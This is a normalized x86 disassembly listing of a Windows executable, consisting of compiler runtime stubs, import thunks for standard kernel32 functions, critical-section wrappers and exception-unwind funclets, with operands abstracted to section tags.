lea eax [ ecx + ecx - 0x1 ]
sub_443394
movzx eax [ eax ]
movzx ecx [ ecx ]
sub eax ecx
je r-xdata
retn
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
sub_446464
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_446359
pop ebp
retn
sub_4466a8
mov edi edi
push esi
call sub_442adc
mov esi [ eax + 0x8 ]
call sub_442a90
mov edx eax
mov eax esi
pop esi
retn
sub_4466be
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_446621
sub_44676e
mov eax ecx
mov [ eax ] r--data
retn
sub_446777
mov [ ecx ] r--data
retn
sub_44677e
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp ecx [ ebp + 0x8 ]
sete al
pop ebp
retn 0x4
sub_4467b1
mov eax [ ecx ]
retn
sub_4467b4
mov eax [ ecx + 0x4 ]
retn
sub_4467b8
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_4467ce
mov eax [ ecx ]
retn
sub_4467d1
mov eax [ ecx + 0x4 ]
retn
sub_4467f6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_44684a
mov eax ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] r--data
retn
sub_44685a
mov eax [ ecx + 0x4 ]
retn
sub_44685e
mov [ ecx ] r--data
retn
sub_446865
mov eax ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] r--data
retn
sub_446875
mov eax [ ecx + 0x4 ]
retn
sub_446879
mov [ ecx ] r--data
retn
sub_446880
mov eax ecx
mov [ eax + 0x4 ] r--data
mov [ eax ] r--data
mov [ eax + 0x8 ] r--data
retn
sub_446897
mov eax [ ecx + 0x8 ]
retn
sub_44689b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_4468af
mov [ ecx ] r--data
retn
sub_4468b6
mov eax rw-data
retn
sub_4468bc
mov eax rw-data
retn
sub_4468c2
mov eax rw-data
retn
j_sub_425354#4
jmp sub_425354
j_sub_425354#3
jmp sub_425354
j_sub_425354#2
jmp sub_425354
j_sub_425354
jmp sub_425354
j_sub_425354#5
jmp sub_425354
sub_446a78
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_425400
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_446ac5
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_425400
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_446b12
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_425400
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_446c34
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_425400
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_446c51
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_425400
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_446d45
mov eax ecx
retn 0x4
sub_446d4a
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn 0x4
sub_446d5a
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_446d70
mov ecx [ ecx + 0x4 ]
call sub_402ed7
test eax eax
je r-xdata
retn
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_446e1d
mov eax [ rw-data ]
retn
sub_446ead
xor eax eax
cmp [ ecx ] eax
sete al
retn
sub_446eb5
mov eax [ ecx ]
test eax eax
jne r-xdata
retn
lea eax [ ecx + 0x4 ]
sub_44716b
call sub_4470dc
mov eax rw-data
retn
sub_447253
mov edi edi
push esi
mov esi ecx
and [ esi ] 0x0
push rw-data
call sub_447f41
pop ecx
mov eax esi
pop esi
retn
sub_447292
mov eax [ ecx ]
cmp eax 0x4
jge r-xdata
retn
imul eax eax 0x18
add eax rw-data
push eax
call sub_447f51
pop ecx
sub_4472a9
push rw-data
call sub_447f41
pop ecx
retn
sub_4472d6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
imul eax eax 0x18
add eax rw-data
push eax
call sub_447f51
pop ecx
pop ebp
retn
sub_4472f1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
and eax 0x3
imul eax eax 0x18
add eax rw-data
push eax
call sub_447f41
pop ecx
pop ebp
retn
sub_44730d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
and eax 0x3
imul eax eax 0x18
add eax rw-data
push eax
call sub_447f51
pop ecx
pop ebp
retn
sub_447343
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_447f31
push [ esi ]
call sub_424fc7
pop ecx
pop ecx
pop esi
retn
sub_44735a
push [ ecx ]
call sub_447f41
pop ecx
retn
sub_447363
push [ ecx ]
call sub_447f51
pop ecx
retn
sub_4473a3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_447f41
pop ecx
pop ebp
retn
sub_4473b5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_447f51
pop ecx
pop ebp
retn
j_sub_448a21
jmp sub_448a21
sub_44763d
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44757a
add esp 0x10
pop ebp
retn
sub_44785b
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_447657
add esp 0x10
pop ebp
retn
sub_447987
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_447b60
sub_447992
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_447bc9
add esp 0xc
pop ebp
retn
sub_447b46
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4479aa
add esp 0x10
pop ebp
retn
sub_447d03
push r-xdata
call sub_42606a
neg eax
sbb eax eax
pop ecx
and eax 0x18
retn
sub_447ebb
jmp r-xdata
cmp [ rw-data ] 0xa
jb r-xdata
mov eax [ rw-data ]
mov eax [ eax * 4 + rw-data ]
inc [ rw-data ]
push eax
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
retn
call eax
sub_447f21
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ InitializeCriticalSection@IAT ]
pop ebp
retn
sub_447f31
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ DeleteCriticalSection@IAT ]
pop ebp
retn
sub_447f41
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ EnterCriticalSection@IAT ]
pop ebp
retn
sub_447f51
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
HeapAlloc
jmp [ HeapAlloc@IAT ]
GetCommandLineA
jmp [ GetCommandLineA@IAT ]
HeapSetInformation
jmp [ HeapSetInformation@IAT ]
GetStartupInfoW
jmp [ GetStartupInfoW@IAT ]
GetLastError
jmp [ GetLastError@IAT ]
HeapFree
jmp [ HeapFree@IAT ]
WriteConsoleW
jmp [ WriteConsoleW@IAT ]
GetFileType
jmp [ GetFileType@IAT ]
GetStdHandle
jmp [ GetStdHandle@IAT ]
GetModuleFileNameW
jmp [ GetModuleFileNameW@IAT ]
EncodePointer
jmp [ EncodePointer@IAT ]
DecodePointer
jmp [ DecodePointer@IAT ]
TerminateProcess
jmp [ TerminateProcess@IAT ]
GetCurrentProcess
jmp [ GetCurrentProcess@IAT ]
UnhandledExceptionFilter
jmp [ UnhandledExceptionFilter@IAT ]
SetUnhandledExceptionFilter
jmp [ SetUnhandledExceptionFilter@IAT ]
IsDebuggerPresent
jmp [ IsDebuggerPresent@IAT ]
IsProcessorFeaturePresent
jmp [ IsProcessorFeaturePresent@IAT ]
ExitProcess
jmp [ ExitProcess@IAT ]
WriteFile
jmp [ WriteFile@IAT ]
HeapCreate
jmp [ HeapCreate@IAT ]
HeapDestroy
jmp [ HeapDestroy@IAT ]
TlsAlloc
jmp [ TlsAlloc@IAT ]
TlsGetValue
jmp [ TlsGetValue@IAT ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
TlsFree
jmp [ TlsFree@IAT ]
InterlockedIncrement
jmp [ InterlockedIncrement@IAT ]
SetLastError
jmp [ SetLastError@IAT ]
__imp_GetCurrentThreadId
jmp [ GetCurrentThreadId@IAT ]
InterlockedDecrement
jmp [ InterlockedDecrement@IAT ]
__imp_GetCurrentThread
jmp [ GetCurrentThread@IAT ]
RaiseException
jmp [ RaiseException@IAT ]
GetModuleFileNameA
jmp [ GetModuleFileNameA@IAT ]
FreeEnvironmentStringsW
jmp [ FreeEnvironmentStringsW@IAT ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
GetEnvironmentStringsW
jmp [ GetEnvironmentStringsW@IAT ]
SetHandleCount
jmp [ SetHandleCount@IAT ]
InitializeCriticalSectionAndSpinCount
jmp [ InitializeCriticalSectionAndSpinCount@IAT ]
DeleteCriticalSection
jmp [ DeleteCriticalSection@IAT ]
QueryPerformanceCounter
jmp [ QueryPerformanceCounter@IAT ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetSystemTimeAsFileTime
jmp [ GetSystemTimeAsFileTime@IAT ]
EnterCriticalSection
jmp [ EnterCriticalSection@IAT ]
LeaveCriticalSection
jmp [ LeaveCriticalSection@IAT ]
SetConsoleCtrlHandler
jmp [ SetConsoleCtrlHandler@IAT ]
LoadLibraryW
jmp [ LoadLibraryW@IAT ]
HeapSize
jmp [ HeapSize@IAT ]
GetLocaleInfoW
jmp [ GetLocaleInfoW@IAT ]
FatalAppExitA
jmp [ FatalAppExitA@IAT ]
FreeLibrary
jmp [ FreeLibrary@IAT ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetACP
jmp [ GetACP@IAT ]
GetOEMCP
jmp [ GetOEMCP@IAT ]
IsValidCodePage
jmp [ IsValidCodePage@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
GetConsoleCP
jmp [ GetConsoleCP@IAT ]
GetConsoleMode
jmp [ GetConsoleMode@IAT ]
FlushFileBuffers
jmp [ FlushFileBuffers@IAT ]
HeapReAlloc
jmp [ HeapReAlloc@IAT ]
LCMapStringW
jmp [ LCMapStringW@IAT ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
GetStringTypeW
jmp [ GetStringTypeW@IAT ]
SetFilePointer
jmp [ SetFilePointer@IAT ]
SetStdHandle
jmp [ SetStdHandle@IAT ]
CreateFileW
jmp [ CreateFileW@IAT ]
CloseHandle
jmp [ CloseHandle@IAT ]
GetUserDefaultLCID
jmp [ GetUserDefaultLCID@IAT ]
GetLocaleInfoA
jmp [ GetLocaleInfoA@IAT ]
EnumSystemLocalesA
jmp [ EnumSystemLocalesA@IAT ]
IsValidLocale
jmp [ IsValidLocale@IAT ]
InterlockedCompareExchange
jmp [ InterlockedCompareExchange@IAT ]
InitializeCriticalSection
jmp [ InitializeCriticalSection@IAT ]
sub_44814a
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_448151
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_448158
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_448255
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax + 0x1c ]
push [ eax + 0x28 ]
push 0x0
push [ eax + 0x18 ]
call sub_448882
add esp 0x10
pop ebp
retn 0x4
sub_44866d
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_448681
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_4247dc
jmp sub_44866d
sub_448690
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_4247dc
jmp sub_44866d
sub_4487a2
mov [ ecx ] r--data
jmp sub_425354
sub_448900
push [ ebp - 0x14 ]
call sub_448833
pop ecx
retn
sub_448944
call sub_426c39
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_426c39
dec [ eax + 0x90 ]
sub_4489e6
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_4489ef
mov esp [ ebp - 0x18 ]
call sub_42b199
sub_448a21
call sub_426c39
xor ecx ecx
cmp [ eax + 0x90 ] ecx
setne al
retn
sub_448c77
push 0x10
pop eax
retn
sub_448c7b
push 0x8
push r--data
call sub_4278c0
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_427905
retn
sub_448c93
push [ ebp - 0x14 ]
call sub_448833
pop ecx
retn
sub_448c9d
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_427905
retn
sub_448cad
push 0x8
push r--data
call sub_4278c0
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
call [ ebp + 0x8 ]
pop ecx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_427905
retn
sub_448cc6
push [ ebp - 0x14 ]
call sub_448833
pop ecx
retn
sub_448cd0
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_427905
retn
sub_448ce0
push 0x8
push r--data
call sub_4278c0
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
call [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_427905
retn
sub_448cf8
push [ ebp - 0x14 ]
call sub_448833
pop ecx
retn
sub_448d02
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_427905
retn
sub_448d33
push [ ebp - 0x14 ]
call sub_448833
pop ecx
retn
sub_448d3d
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_427905
retn
sub_448dc3
push 0x4
mov eax sub_449e25
call sub_4485c8
call sub_426c39
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_42b1d2
call sub_42b1e5
sub_448f54
mov eax [ ebp - 0x14 ]
call sub_44895e
retn
sub_4491cb
xor eax eax
inc eax
retn
sub_4491cf
mov esp [ ebp - 0x18 ]
call sub_42b199
sub_449264
xor eax eax
inc eax
retn
sub_449268
mov esp [ ebp - 0x18 ]
call sub_42b199
sub_4498a9
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_425400
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_449b3b
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_449a18
add esp 0xc
pop ebp
retn
sub_449bac
mov eax rw-data
retn
sub_449bb2
mov eax rw-data
retn
sub_449bb8
mov edi edi
push ebp
mov ebp esp
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
sub_449bca
mov edi edi
push ebp
mov ebp esp
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
sub_449bdc
mov edi edi
push ebp
mov ebp esp
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
sub_449cc0
cmp [ rw-data ] 0x0
je sub_449cf6
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff8
fstp [ esp ]
cvttsd2si eax [ esp ]
leave
retn
sub_449d6b
lea ecx [ ebp - 0x10 ]
jmp sub_447292
sub_449d73
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_449d8e
lea ecx [ ebp - 0x10 ]
jmp sub_447292
sub_449d96
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_449db1
lea ecx [ ebp - 0x10 ]
jmp sub_447292
sub_449db9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_449dd4
mov ecx [ ebp - 0x10 ]
jmp sub_402f22
sub_449ddc
mov ecx [ ebp - 0x10 ]
add ecx 0x18
jmp sub_403b30
sub_449de7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_449e02
lea ecx [ ebp - 0x10 ]
jmp sub_447292
sub_449e0a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_449e25
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_449e40
lea esi [ ebp - 0x14 ]
jmp sub_403fa1
sub_449e48
lea esi [ ebp - 0x10 ]
jmp sub_403fa1
sub_449e50
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_449e6b
mov ecx [ ebp + 0x8 ]
jmp sub_447292
sub_449e73
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_403b30
sub_449e7e
mov ecx [ ebp + 0x8 ]
add ecx 0xc
jmp sub_403b30
sub_449e89
mov ecx [ ebp + 0x8 ]
add ecx 0x14
jmp sub_403b30
sub_449e94
mov ecx [ ebp + 0x8 ]
add ecx 0x1c
jmp sub_403b30
sub_449e9f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_449eba
push [ ebp + 0x8 ]
call sub_424fc7
pop ecx
retn
sub_449ec4
push [ ebp + 0x8 ]
call sub_424fc7
pop ecx
retn
sub_449ece
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_449ee9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_449f04
mov esi [ ebp + 0x8 ]
jmp sub_40c464
sub_449f0c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_449f27
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_406a33
sub_449f32
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_449f4d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_449f68
mov ecx [ ebp + 0x8 ]
jmp sub_402f22
sub_449f70
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_449f8b
mov ecx [ ebp + 0x8 ]
jmp sub_447292
sub_449f93
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_403b30
sub_449f9e
mov ecx [ ebp + 0x8 ]
add ecx 0xc
jmp sub_403b30
sub_449fa9
mov ecx [ ebp + 0x8 ]
add ecx 0x14
jmp sub_403b30
sub_449fb4
mov ecx [ ebp + 0x8 ]
add ecx 0x1c
jmp sub_403b30
sub_449fbf
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_449fda
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_449fe2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_449ffd
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a005
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a020
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a028
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a043
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a04b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a066
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a081
mov eax [ ebp + 0x8 ]
jmp sub_41eb7d
sub_44a089
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a0a4
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a0ac
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a0c7
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a0cf
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a0ea
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a0f2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a10d
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a115
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a130
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a138
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a153
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a15b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a176
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a17e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a199
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a1a1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a1bc
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a1c4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a1df
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a1e7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a202
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a20a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a225
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a22d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a248
lea eax [ ebp - 0x48 ]
jmp sub_41cb73
sub_44a250
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4c ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a26b
lea eax [ ebp - 0x1c ]
jmp sub_41cb73
sub_44a273
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a28e
lea eax [ ebp - 0x18 ]
jmp sub_41cb73
sub_44a296
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a2b1
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a2b9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a2d4
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a2dc
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a2f7
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a2ff
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a31a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a335
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a33d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a358
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a360
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a37b
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a383
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a39e
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a3a6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a3c1
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a3c9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a3e4
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a3ec
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44a407
mov eax [ ebp + 0x8 ]
jmp sub_40c3a9
sub_44a40f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
